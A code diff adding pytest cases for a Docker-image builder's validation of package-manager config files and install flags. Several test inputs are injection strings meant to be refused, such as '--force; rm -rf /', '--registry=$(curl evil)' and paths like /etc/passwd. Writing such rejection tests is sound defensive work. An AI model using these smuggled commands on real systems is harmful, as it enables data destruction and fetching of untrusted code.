@@ -105,6 +105,40 @@ def test_session_file_accepts_the_key_and_still_refuses_bogus_ones(tmp_path):
     ({**NODE, "browsers": ["edge"], "packages": ["playwright@1.50.0"]}, "unknown browser"),
     ({**PY, "browsers": ["chromium"]}, "only for lang: node"),
     ({**NODE, "run": "curl evil | sh"}, "unknown key"),
+    ({**NODE, "config_files": [".npmrc"]}, "`config_files` needs a `project`"),
+    ({**NODE, "install_flags": ["--force"]}, "`install_flags` needs a `project`"),
+    ({**NODE, "project": "a", "config_files": ".npmrc"}, "must be a list of strings"),
+    ({**NODE, "project": "a", "config_files": ["/etc/passwd"]}, "not file names in the project"),
+    ({**NODE, "project": "a", "config_files": ["../.npmrc"]}, "not file names in the project"),
+    ({**NODE, "project": "a", "config_files": ["sub/.npmrc"]}, "not file names in the project"),
+    ({**NODE, "project": "a", "config_files": [".."]}, "not file names in the project"),
+    ({**NODE, "project": "a", "config_files": [".npmrc", ".npmrc"]}, "lists a file twice"),
+    ({**NODE, "project": "a", "install_flags": ["--force; rm -rf /"]}, "not single long options"),
+    ({**NODE, "project": "a", "install_flags": ["--force && curl evil"]}, "not single long options"),
+    ({**NODE, "project": "a", "install_flags": ["--registry=$(curl evil)"]}, "not single long options"),
+    ({**NODE, "project": "a", "install_flags": ["--legacy-peer-deps --force"]}, "not single long options"),
+    ({**NODE, "project": "a", "install_flags": ["--force\n"]}, "not single long options"),
+    ({**NODE, "project": "a", "install_flags": ["-f"]}, "not single long options"),
+    ({**NODE, "project": "a", "install_flags": ["--registry=`id`"]}, "not single long options"),
+    ({**PY, "project": "a", "install_flags": "--offline"}, "must be a list of strings"),
+    # the per-mode allow-list: nothing that moves the install or weakens the lockfile
+    ({**NODE, "project": "a", "install_flags": ["--prefix=/work"]}, "not allowed for `npm` `ci`"),
+    ({**NODE, "project": "a", "install_flags": ["--global"]}, "not allowed"),
+    ({**NODE, "project": "a", "install_flags": ["--userconfig=/tmp/x"]}, "not allowed"),
+    ({**NODE, "project": "a", "install_flags": ["--legacy-peer-deps=true"]}, "not allowed"),
+    ({**NODE, "project": "a", "install_flags": ["--registry"]}, "not allowed"),
+    ({**NODE, "project": "a", "manager": "pnpm", "install_flags": ["--no-frozen-lockfile"]}, "not allowed"),
+    ({**NODE, "project": "a", "manager": "yarn", "install_flags": ["--modules-folder=/work"]}, "not allowed"),
+    ({**NODE, "project": "a", "manager": "yarn", "install_flags": ["--legacy-peer-deps"]}, "not allowed"),
+    ({**PY, "project": "a", "install_flags": ["--frozen"]}, "not allowed for `uv` `sync`"),
+    ({**PY, "project": "a", "install_flags": ["--no-deps"]}, "not allowed for `uv` `sync`"),
+    ({**PY, "project": "a", "install": "requirements", "install_flags": ["--target=/work"]}, "not allowed"),
+    ({**PY, "project": "a", "manager": "pip", "install_flags": ["--trusted-host=evil"]}, "not allowed"),
+    ({**NODE, "project": "a", "install_flags": ["--registry=https://u:p@r.example.com/"]}, "URL credentials"),
+    ({**NODE, "project": "a", "install_flags": ["--registry=https://ghp_abc123@npm.pkg.github.com/"]},
+     "URL credentials"),
+    ({**PY, "project": "a", "install_flags": ["--index-url=https://tok@pypi.example.com/simple"]},
+     "URL credentials"),
     ("node", "must be a mapping"),
 ])
 def test_bad_blocks_are_refused(block, match):
@@ -260,6 +294,118 @@ def test_session_file_is_never_a_project(tmp_path):
     (tmp_path / "glove-session.yml").write_text("glove: 3\n")
     with pytest.raises(ConfigError, match="is not a directory"):
         _plan(tmp_path, toolchains=[{**NODE, "project": "glove-session.yml"}])
+
+
+# --- config_files + install_flags -------------------------------------------------------------
+
+
+NPMRC = "registry = https://registry.example.com/npm/\nlink-workspace-packages = true\nlegacy-peer-deps = true\n"
+
+
+def test_config_files_are_baked_beside_the_manifest_before_the_install(tmp_path):
+    app = _node_project(tmp_path / "app")
+    (app / ".npmrc").write_text(NPMRC)
+    plan = _plan(tmp_path, toolchains=[{**NODE, "project": "app", "config_files": [".npmrc"]}])
+    df = plan.derived_dockerfile
+    copy = ('COPY ["toolchain-node/package.json", "toolchain-node/package-lock.json", '
+            '"toolchain-node/.npmrc", "/opt/glove/toolchains/node/project/"]')
+    assert copy in df and df.index(copy) < df.index("npm ci")
+    assert (app / ".npmrc").resolve() in plan.toolchains[0].project_files
+    dest = tmp_path / "ctx"
+    stage_context(dest, [("toolchain-node", f) for f in plan.toolchains[0].project_files])
+    assert (dest / "toolchain-node" / ".npmrc").read_text() == NPMRC
+
+
+def test_install_flags_are_appended_to_every_managers_install(tmp_path):
+    _node_project(tmp_path / "app")
+    df = _plan(tmp_path, toolchains=[{**NODE, "project": "app", "install_flags": [
+        "--legacy-peer-deps", "--registry=https://registry.example.com/npm/"]}]).derived_dockerfile
+    assert ("npm ci --no-audit --no-fund --cache /tmp/npm-cache --legacy-peer-deps "
+            "--registry=https://registry.example.com/npm/ \\\n") in df
+    # only the project install: never the global tools step
+    assert df.count("--legacy-peer-deps") == 1
+    _node_project(tmp_path / "pn", "pnpm-lock.yaml")
+    df = _plan(tmp_path, toolchains=[{**NODE, "manager": "pnpm", "project": "pn",
+                                      "install_flags": ["--prefer-offline"]}]).derived_dockerfile
+    assert "pnpm install --frozen-lockfile --store-dir /tmp/pnpm-store --prefer-offline \\\n" in df
+    _py_project(tmp_path / "tool")
+    df = _plan(tmp_path, toolchains=[{**PY, "project": "tool", "install_flags": ["--no-dev"]}]).derived_dockerfile
+    assert "uv sync --locked --no-install-project --python 3.12 --no-dev \\\n" in df
+    (tmp_path / "req").mkdir()
+    (tmp_path / "req" / "requirements.txt").write_text("rich\n")
+    df = _plan(tmp_path, toolchains=[{**PY, "manager": "pip", "project": "req",
+                                      "install_flags": ["--no-deps"]}]).derived_dockerfile
+    assert "-m pip install --no-cache-dir -r requirements.txt --no-deps \\\n" in df
+
+
+@pytest.mark.parametrize(("setup", "config_files", "match"), [
+    (lambda app: None, [".npmrc"], "is not a file"),
+    (lambda app: (app / ".npmrc").mkdir(), [".npmrc"], "is not a file"),
+    (lambda app: None, ["package-lock.json"], "already baked"),
+    (lambda app: ((app.parent / "elsewhere").write_text(NPMRC), (app / ".npmrc").symlink_to(app.parent / "elsewhere")),
+     [".npmrc"], "is a symlink"),
+    (lambda app: (app / ".npmrc").write_text("//registry.example.com/:_authToken=abc123\n"), [".npmrc"],
+     r"carries a credential \(line 1\)"),
+    (lambda app: (app / ".npmrc").write_text("registry=https://x/\n_auth=dXNlcjpwYXNz\n"), [".npmrc"],
+     r"credential \(line 2\)"),
+    (lambda app: (app / ".npmrc").write_text("_password=c2VjcmV0\n"), [".npmrc"], "credential"),
+    (lambda app: (app / ".npmrc").write_text("//r/:_authToken=${NPM_TOKEN}\n"), [".npmrc"], "credential"),
+    (lambda app: (app / ".yarnrc.yml").write_text('npmAuthToken: "abc"\n'), [".yarnrc.yml"], "credential"),
+    (lambda app: (app / "pip.conf").write_text("[global]\nindex-url = https://u:p@pypi.example.com/simple\n"),
+     ["pip.conf"], "credential"),
+    # yarn v1 writes `key "value"`: the `:` inside the registry URL is part of the key
+    (lambda app: (app / ".yarnrc").write_text('"//registry.npmjs.org/:_authToken" "npm_abc123"\n'),
+     [".yarnrc"], r"credential \(line 1\)"),
+    (lambda app: (app / ".yarnrc").write_text("registry \"https://r.example.com/\"\n_authToken npm_abc\n"),
+     [".yarnrc"], r"credential \(line 2\)"),
+    (lambda app: (app / ".npmrc").write_text("//r.example.com/:_password = c2VjcmV0\n"), [".npmrc"], "credential"),
+    # a token as the bare URL username
+    (lambda app: (app / ".npmrc").write_text("registry=https://ghp_abc123@npm.pkg.github.com/\n"),
+     [".npmrc"], "credential"),
+    (lambda app: (app / "uv.toml").write_text('[[index]]\nurl = "https://tok@pypi.example.com/simple"\n'),
+     ["uv.toml"], "credential"),
+])
+def test_config_file_validation(tmp_path, setup, config_files, match):
+    setup(_node_project(tmp_path / "app"))
+    with pytest.raises(ConfigError, match=match):
+        _plan(tmp_path, toolchains=[{**NODE, "project": "app", "config_files": config_files}])
+
+
+def test_config_file_credential_check_ignores_comments_and_values(tmp_path):
+    app = _node_project(tmp_path / "app")
+    (app / ".npmrc").write_text("# _authToken goes in ~/.npmrc, never here\n; password too\n"
+                                "registry=https://tokens.example.com:8443/npm/\nalways-auth=false\n"
+                                "git-tag-version = false\nscope-registry ssh://git@github.com/org/repo\n"
+                                'yarn-path "/opt/token-free/yarn.js"\n')
+    plan = _plan(tmp_path, toolchains=[{**NODE, "project": "app", "config_files": [".npmrc"]}])
+    assert "toolchain-node/.npmrc" in plan.derived_dockerfile
+
+
+def test_content_hash_tracks_config_files_and_install_flags(tmp_path):
+    app = _node_project(tmp_path / "app")
+    (app / ".npmrc").write_text(NPMRC)
+
+    def tag(**kw):
+        blocks = tcs.resolve([{**NODE, "project": "app", **kw}], tmp_path)
+        lines, staged = tcs.dockerfile_lines(blocks)
+        return content_hash("\n".join(lines), staged)
+
+    base = tag()
+    with_npmrc = tag(config_files=[".npmrc"])
+    assert with_npmrc != base
+    (app / ".npmrc").write_text(NPMRC.replace("legacy-peer-deps = true\n", ""))
+    assert tag(config_files=[".npmrc"]) != with_npmrc
+    assert tag() == base  # an unlisted .npmrc is never baked or hashed
+    flagged = tag(install_flags=["--legacy-peer-deps"])
+    assert flagged != base
+    assert tag(install_flags=["--force"]) != flagged
+
+
+def test_unset_config_files_and_install_flags_render_identically(tmp_path):
+    _node_project(tmp_path / "app")
+    plain = _plan(tmp_path, toolchains=[{**NODE, "project": "app"}])
+    empty = _plan(tmp_path, toolchains=[{**NODE, "project": "app", "config_files": [], "install_flags": None}])
+    assert plain.derived_dockerfile == empty.derived_dockerfile and plain.image == empty.image
 
 
 def test_non_strict_install_mode_needs_only_the_manifest(tmp_path):
